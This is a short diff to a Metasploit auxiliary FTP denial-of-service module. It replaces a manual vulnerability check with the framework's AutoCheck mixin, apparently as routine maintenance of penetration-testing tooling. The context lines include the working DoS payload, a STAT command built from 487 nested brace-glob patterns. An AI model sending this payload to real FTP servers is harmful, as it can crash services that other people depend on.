@@ -6,6 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Ftp
   include Msf::Auxiliary::Dos
+  prepend Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
     super(
@@ -92,8 +93,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    fail_with(Failure::NotVulnerable, 'Target is not vulnerable') if check != Exploit::CheckCode::Appears
-
     payload = 'STAT ' + '{{*},' * 487 + '{.}' + '}' * 487
     vprint_status("FTP DoS command: #{payload}")
 
